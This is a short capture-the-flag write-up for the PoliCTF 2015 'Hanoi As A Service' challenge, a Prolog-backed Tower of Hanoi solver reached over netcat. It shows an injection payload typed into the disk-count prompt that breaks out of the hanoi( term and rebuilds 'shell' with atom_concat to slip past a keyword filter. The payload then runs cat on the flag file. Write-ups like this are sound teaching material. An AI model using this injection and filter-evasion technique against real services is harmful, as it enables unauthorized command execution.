# PoliCTF 2015: Hanoi As A Service

**Category:** Pwnable
**Points:** 50
**Solves:** 191
**Description:**

> Check out our shiny new HaaS platform!
> nc haas.polictf.it 80

## Write-up

This pwnable is pretty simple, it seems to be a tower of hanoi solver. 
>```bash
>$ nc haas.polictf.it 80
> Welcome to the Hanoi-as-a-Service cloud platform!
> How many disks does your tower have?
> 3
> * Move top disk from a to b
> * Move top disk from a to c
> * Move top disk from b to c
> * Move top disk from a to b
> * Move top disk from c to a
> * Move top disk from c to b
> * Move top disk from a to b
>```

After messing around with it and looking up error codes, it seems to be using prolog which is a logical programming language.

>```bash
>$ nc haas.polictf.it 80
> Welcome to the Hanoi-as-a-Service cloud platform!
> How many disks does your tower have?
>)
>ERROR: Prolog initialisation failed:
>ERROR: Syntax error: Illegal start of term
>ERROR: hanoi()
>ERROR: ** here **
>ERROR: ) . 
>```

Also there is a filter that terminates the session if anything os related is sent. After looking around on prolog functions, it turns out you can concatenate two atoms and use the call function on the result to by pass the filter. 

>```bash
>% nc haas.polictf.it 80
>Welcome to the Hanoi-as-a-Service cloud platform!
>How many disks does your tower have?
>0), L = 'shel',K = 'l',atom_concat(L,K,M),call(M,'cat /home/ctf/haas/jhknsjdfhef_flag_here'), hanoi(0
>flag{Pr0gramm1ng_in_l0g1c_1s_c00l}
>```

## Other write-ups and resources

* <http://www.mrt-prodz.com/blog/view/2015/07/polictf-2015---hanoi-as-a-service-50pts-writeup>
* <https://ctf-team.vulnhub.com/polictf-2015-hanoi-as-a-service/>
